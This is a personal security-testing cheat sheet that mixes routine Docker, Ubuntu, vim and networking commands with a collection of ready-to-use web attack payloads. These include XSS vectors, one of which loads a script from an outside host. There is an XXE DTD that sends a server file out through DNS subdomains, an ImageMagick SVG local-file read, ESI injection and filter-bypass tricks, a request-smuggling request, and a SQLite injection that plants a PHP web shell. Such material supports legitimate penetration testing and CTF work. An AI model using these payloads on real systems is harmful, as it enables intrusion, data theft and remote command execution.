
# ahp_cheatsheet

### Contents
- [Burp Suite Professional](#burp-suite-professional)
- [Docker](#docker)
- [Ubuntu](#ubuntu)
- [Web Applications Security](#web-applications-security)
   + [XSS](#xss) 
   + [XXE](#xxe)
   + [LFI](#lfi)
   + [ESI](#esi)
   + [Request Smuggling](#request-smuggling)
   + [Hackvertor](#hackvertor)
   + [SQL Injection](#sql-injection)
   + [PHP](#php)
- [Network](#network)
- [/dev/null](#devnull)  
- [low-level](#low-level)  

## Burp Suite Professional
### Running own collaborator:  
`java -Xms10m -Xmx200m -XX:GCTimeRatio=19 -jar burp.jar --collaborator-server`

Non-standard ports:  
Configuration file: `--collaborator-config=myconfig.config`
 - https://portswigger.net/burp/documentation/collaborator/deploying#running-on-non-standard-ports
 - https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format

## Docker
### Run from _Dockerfile_ in directory:  
```docker build -t name .```  
### Remove all stopped containers  
```docker container prune```
### Remove dangling images
```docker image prune```  
### Stop and remove all containers
```
$ docker container stop $(docker container ls -aq)
$ docker container rm $(docker container ls -aq)
```

## Ubuntu
### Setup polish locales
Show locales:  
`locale -a`

Show default locales:  
`cat /etc/default/locale `

Install polish locale:  
`sudo locale-gen pl_PL.utf8`

Setup locales:  
`update-locale LANG=pl_PL.utf8`

### Add wireguard to systemd:  
```sh
# Add:  
sudo systemctl enable wg-quick@wg0.service
sudo systemctl daemon-reload
# Run:  
sudo systemctl start wg-quick@wg0
# Check status:
systemctl status wg-quick@wg0
```  

## Web Applications Security
### XSS
Some helpful payloads caught in the wild
```html
<svG x=1 onload=(co\u006efirm)``//
<embed src=//14.rs>
<marquee loop=1 width=0 onfinish=confirm(1)>
<marquee/onstart=alert(1)>
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
<svg><a><rect width=100% height=100% /><animate attributeName=href to=javascript:alert(document.location)>
<svg><a><animate attributeName=href to=javascript:alert(document.location) /><text y=15>Click me!</text></a>
```

### XXE  
#### Exfiltrate in subdomain name:  
dtd file without .dtd extension _(test.html)_:  
```xml
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.b0f4f2d1d89d4ec413ad.d.zhack.ca'>">
%eval;
%exfiltrate;
```  
Injection:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
```  
http://dnsbin.zhack.ca/  
### LFI
SVG LFI (ImageMagick):  
https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/  
```
<?xml version="1.0" encoding="UTF-8"?>
<svg width="1200px" height="1200px">
  <image width="1200" height="1200" href="text:/etc/hosts" />
</svg>
```
### ESI 
*Edge Side Include Injection*    
WAF'alike bypass:
```html
<svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
```
```html
he<!--esi-->llo -> hello 
but
he<!--esx-->llo isn't modified 
you have ESI injection
```
```xml
<esi:include src="/anypage.html" dca="none" />
```
XSS  
```
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
```
 - https://twitter.com/alxbrsn/status/981256374230319112
 - https://t.co/XRxIalWcng?amp=1 
 - https://t.co/vzRIo3RuaR?amp=1
 - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
 
 ### Request Smuggling  
 TE.CL + Hackvertor  
 *(disable “Update Content-Length” in Repeater && “Auto Update Content Length” in Hackvertor Settings)*  
 ```
 POST / HTTP/1.1
Host: abc.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

<@chunked_dec2hex_4><@get_var_3 /><@/chunked_dec2hex_4>
<@set_var_1><@length_2>GPOST / HTTP/1.1
Host: abc.com
Content-Length: 15

x=1<@/length_2><@/set_var_1>
0
```
 ### Hackvertor  
 JSON escape:
```xml
 <@python_4("import json;output = json.dumps(input)","7d808063a7c69f9dad4f4a3cb1c2bd1a")>test123'<>"<@/python_4>
 Result: "test123'<>\""
```
### SQL Injection
#### SQLite  
Connect:  
`$ sqlite3 test.db`  

Command execution:  
```sql
ATTACH DATABASE '/var/www/html/y.php' AS y;--
CREATE TABLE y.p (dataz text);--
INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
```  
#### Alternatives to information_schema table (MySQL)
```sql
SELECT * FROM sys.x$schema_flattened_keys;
```
Blind SQL Injection without _in_:  
https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952  
### PHP
### finfo with specific comment
```php
// After Upload:
echo (new finfo)->file($_FILES["fileToUpload"]["tmp_name"]);
//Rendered:
JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, comment: "AAAAAAAAAAAAAAAAAA"
/*
Uploaded file:
$ cat test1234.txt | base64
/9j/4AAQSkZJRgABAgAAAQABAAD//kFBQUFBQUFBQUFBQUFBQUFBQUFB
*/
```
## Network  
### Lookup and display the route for a destination  
```
route get 192.168.13.14
```

## /dev/null
### nc permanent 'web-server'
```sh
while true; do 
  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 1500 -q 1
done
```

### vim - nice colors for dark background
```
:set background=dark
```
permanently:
```
echo 'set background=dark' >> $HOME/.vimrc
```

### vim - show line numbers
```
:set number
```  

### vim - use a mouse  
```
:set mouse=a
```  

### vmnet restart
```
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --stop
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --config
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start
Check your current status:
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --status
```  
  
## low-level
### GLIBC version
```sh
ldd --version
```

### Negative integer (_i.e. from printf(%d)/unsigned int_) to hex in python
```py
>>> hex(-199703103 & (2**32-1)) # 32-bit
'0xf418c5c1L'
>>> hex(-199703103 & (2**64-1)) # 64-bit
'0xfffffffff418c5c1L'
```
